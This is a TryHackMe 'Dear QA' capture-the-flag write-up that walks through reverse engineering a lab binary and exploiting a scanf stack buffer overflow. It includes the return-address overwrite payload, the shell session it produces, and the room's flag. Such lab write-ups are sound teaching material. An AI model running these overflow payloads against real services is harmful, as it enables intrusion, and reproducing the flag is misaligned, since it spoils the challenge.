## Dear QA - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/dearqa)

<i>Download the binary by clicking the Download Task Files button.

There's a service running on port 5700. Start the machine using the green button on this task.</i>

**IP: 10.10.195.46**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Reverse Engineering <br>

**Tools Used**: Nmap, Ghidra, Objdump<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Ran Nmap scan while checking the binary.

  ```
  nmap -sC -sV -T5 -p- 10.10.195.46

  PORT      STATE SERVICE        VERSION
  22/tcp    open  ssh            OpenSSH 6.7p1 Debian 5 (protocol 2.0)
  | ssh-hostkey: 
  |   1024 ae:4d:ab:61:d0:3e:54:87:1e:f3:d0:f6:9b:4b:7f:ed (DSA)
  |   2048 11:ae:43:5a:4b:7d:a9:60:8f:9f:aa:34:ec:fd:bb:af (RSA)
  |   256 b2:b5:65:68:b2:68:97:e9:34:ba:03:77:ef:0d:43:19 (ECDSA)
  |_  256 fe:06:d3:e7:cf:14:fa:9f:01:01:7a:8c:66:65:67:42 (ED25519)
  111/tcp   open  rpcbind        2-4 (RPC #100000)
  | rpcinfo: 
  |   program version    port/proto  service
  |   100000  2,3,4        111/tcp   rpcbind
  |   100000  2,3,4        111/udp   rpcbind
  |   100000  3,4          111/tcp6  rpcbind
  |   100000  3,4          111/udp6  rpcbind
  |   100024  1          37167/udp   status
  |   100024  1          49852/tcp6  status
  |   100024  1          52799/tcp   status
  |_  100024  1          58361/udp6  status
  5700/tcp  open  supportassist?
  | fingerprint-strings: 
  |   DNSStatusRequestTCP: 
  |     ^@^L^@^@^P^@^@^@^@^@^@^@^@^@Welcome dearQA
  |     sysadmin, i am new in developing
  |     What's your name:
  |   DNSVersionBindReqTCP: 
  |     ^CWelcome dearQA
  |     sysadmin, i am new in developing
  |     What's your name:
  |   GenericLines, NULL: 
  |     Welcome dearQA
  |     sysadmin, i am new in developing
  |     What's your name:
  |   GetRequest: 
  |     GET / HTTP/1.0
  |     Welcome dearQA
  |     sysadmin, i am new in developing
  |     What's your name: Hello: GET
  |   HTTPOptions: 
  |     OPTIONS / HTTP/1.0
  |     Welcome dearQA
  |     sysadmin, i am new in developing
  |     What's your name: Hello: OPTIONS
  |   Help: 
  |     HELP
  |     Welcome dearQA
  |     sysadmin, i am new in developing
  |     What's your name: Hello: HELP
  |   RTSPRequest: 
  |     OPTIONS / RTSP/1.0
  |     Welcome dearQA
  |     sysadmin, i am new in developing
  |     What's your name: Hello: OPTIONS
  |   SSLSessionReq: 
  |     ^C^@?G
  |     ^Pn^@^@(^@^
  |     ^@^@
  |     ^@f^@^E^@^@e^@d^@c^@b^@a^@`^@
  |     ^@^R
  |     ^@^@ ^@^T^@^C^A^@Welcome dearQA
  |     sysadmin, i am new in developing
  |     What's your name:
  |   TerminalServerCookie: 
  |     ^C^@^@^@Welcome dearQA
  |     sysadmin, i am new in developing
  |_    What's your name:
  52799/tcp open  status         1 (RPC #100024)
  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  [SNIP!]
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- Checking the binary.

  ```
  file DearQA.DearQA                                                                                 
  DearQA.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
  
  chmod +x DearQA.DearQA 
                                                                                                                       
  ./DearQA.DearQA 
  Welcome dearQA
  I am sysadmin, i am new in developing
  What's your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  zsh: segmentation fault  ./DearQA.DearQA
  ```
  
- Main function.

  ```
  undefined8 main(void)

  {
    undefined local_28 [32];
    
    puts("Welcome dearQA");
    puts("I am sysadmin, i am new in developing");
    printf("What's your name: ");
    fflush(stdout);
    __isoc99_scanf(&DAT_00400851,local_28);
    printf("Hello: %s\n",local_28);
    return 0;
  }
  ```

- Void function.

  ```
  void vuln(void)

  {
    puts("Congratulations!");
    puts("You have entered in the secret function!");
    fflush(stdout);
    execve("/bin/bash",(char **)0x0,(char **)0x0);
    return;
  }
  ```

- The scanf is vulnerable to buffer overflow.

- We know that the buffer size is 32 bytes, let’s exploit it. Also, we found the vuln function, our goal is to jump from the scanf to the vuln function.

- This is possible by using the buffer overflow attack and call the address of the vuln function.

- Object dump.

  ```
  objdump -d ./DearQA.DearQA

  ./DearQA.DearQA:     file format elf64-x86-64
  
  Disassembly of section .init:
  
  00000000004004f0 <_init>:
    4004f0:       48 83 ec 08             sub    $0x8,%rsp
    4004f4:       48 8b 05 a5 06 20 00    mov    0x2006a5(%rip),%rax        # 600ba0 <__gmon_start__>
    4004fb:       48 85 c0                test   %rax,%rax
    4004fe:       74 05                   je     400505 <_init+0x15>
    400500:       e8 5b 00 00 00          call   400560 <__gmon_start__@plt>
    400505:       48 83 c4 08             add    $0x8,%rsp
    400509:       c3                      ret
  
  [SNIP!]
  
  0000000000400686 <vuln>:
    400686:       55                      push   %rbp
    400687:       48 89 e5                mov    %rsp,%rbp
    40068a:       bf b8 07 40 00          mov    $0x4007b8,%edi
    40068f:       e8 8c fe ff ff          call   400520 <puts@plt>
    400694:       bf d0 07 40 00          mov    $0x4007d0,%edi
    400699:       e8 82 fe ff ff          call   400520 <puts@plt>
    40069e:       48 8b 05 6b 05 20 00    mov    0x20056b(%rip),%rax        # 600c10 <stdout@GLIBC_2.2.5>
    4006a5:       48 89 c7                mov    %rax,%rdi
    4006a8:       e8 c3 fe ff ff          call   400570 <fflush@plt>
    4006ad:       ba 00 00 00 00          mov    $0x0,%edx
    4006b2:       be 00 00 00 00          mov    $0x0,%esi
    4006b7:       bf f9 07 40 00          mov    $0x4007f9,%edi
    4006bc:       e8 8f fe ff ff          call   400550 <execve@plt>
    4006c1:       5d                      pop    %rbp
    4006c2:       c3                      ret
  
  00000000004006c3 <main>:
    4006c3:       55                      push   %rbp
    4006c4:       48 89 e5                mov    %rsp,%rbp
    4006c7:       48 83 ec 20             sub    $0x20,%rsp
    4006cb:       bf 03 08 40 00          mov    $0x400803,%edi
    4006d0:       e8 4b fe ff ff          call   400520 <puts@plt>
    4006d5:       bf 18 08 40 00          mov    $0x400818,%edi
    4006da:       e8 41 fe ff ff          call   400520 <puts@plt>
    4006df:       bf 3e 08 40 00          mov    $0x40083e,%edi
    4006e4:       b8 00 00 00 00          mov    $0x0,%eax
    4006e9:       e8 42 fe ff ff          call   400530 <printf@plt>
    4006ee:       48 8b 05 1b 05 20 00    mov    0x20051b(%rip),%rax        # 600c10 <stdout@GLIBC_2.2.5>
    4006f5:       48 89 c7                mov    %rax,%rdi
    4006f8:       e8 73 fe ff ff          call   400570 <fflush@plt>
    4006fd:       48 8d 45 e0             lea    -0x20(%rbp),%rax
    400701:       48 89 c6                mov    %rax,%rsi
    400704:       bf 51 08 40 00          mov    $0x400851,%edi
    400709:       b8 00 00 00 00          mov    $0x0,%eax
    40070e:       e8 6d fe ff ff          call   400580 <__isoc99_scanf@plt>
    400713:       48 8d 45 e0             lea    -0x20(%rbp),%rax
    400717:       48 89 c6                mov    %rax,%rsi
    40071a:       bf 54 08 40 00          mov    $0x400854,%edi
    40071f:       b8 00 00 00 00          mov    $0x0,%eax
    400724:       e8 07 fe ff ff          call   400530 <printf@plt>
    400729:       b8 00 00 00 00          mov    $0x0,%eax
    40072e:       c9                      leave
    40072f:       c3                      ret
  
  [SNIP!]
  ```
  
- The hex value 0x20 is 32 in decimal and the address of vuln is 00400686 in hex.

- So the following assembly is the same with this c language representation : undefined local_28 [32];

  ```4006c7:       48 83 ec 20             sub    $0x20,%rsp```

- After that the scanf uses the defined buffer size to read the user input. So the following assembly is the same with this c language representation : __isoc99_scanf(&DAT_00400851,local_28);

  ```
  40070e:       e8 6d fe ff ff          call   400580 <__isoc99_scanf@plt>
  400713:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  ```

## 💥 Exploitation

- The endian format of `0000000000400686` is `\x86\x06\x40\x00\x00\x00\x00\x00`. `"A"*32` to reach the maximum buffer capacity and `"B"*8` to reach the RSP and put the address of the vuln function.

  ```
  ruby -e 'print "A"*32 + "B"*8 + "\x86\x06\x40\x00\x00\x00\x00\x00"' | ./DearQA.DearQA
  Welcome dearQA
  I am sysadmin, i am new in developing
  What's your name: Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB�@
  Congratulations!
  You have entered in the secret function!
  ```

- I wrote a script for getting the access to machine and read the flag. You can find the script [here](https://github.com/mauzware/Random-Scripts/blob/main/pwn-other/pwnscript.py).

  ```
  python3 pwnscript.py 
  [+] Opening connection to 10.10.195.46 on port 5700: Done
  [*] Switching to interactive mode
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86^F@^@^@^@^@^@
  Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86\x06@
  Congratulations!
  You have entered in the secret function!
  bash: cannot set terminal process group (444): Inappropriate ioctl for device
  bash: no job control in this shell
  ctf@dearqa:/home/ctf$ $ ls -al
  ls -al
  total 40
  drwxr-xr-x 2 ctf  ctf  4096 Jul 24  2021 .
  drwxr-xr-x 3 root root 4096 Jul 24  2021 ..
  -rw------- 1 ctf  ctf   649 May 27 15:30 .bash_history
  -rw-r--r-- 1 ctf  ctf   220 Jul 24  2021 .bash_logout
  -rw-r--r-- 1 ctf  ctf  3515 Jul 24  2021 .bashrc
  -rw-r--r-- 1 ctf  ctf   675 Jul 24  2021 .profile
  -r-xr-xr-x 1 ctf  ctf  7712 Jul 24  2021 DearQA
  -rwx------ 1 root root  413 Jul 24  2021 dearqa.c
  -r--r--r-- 1 ctf  ctf    22 Jul 24  2021 flag.txt
  
  ctf@dearqa:/home/ctf$ $ cat flag.txt
  cat flag.txt
  THM{PWN_1S_V3RY_E4SY}
  ```

---

## 🏁 Flags

- **Flag**: `THM{PWN_1S_V3RY_E4SY}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Whole room.`

- What did I learn?
  `A lot about reverse engineering.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
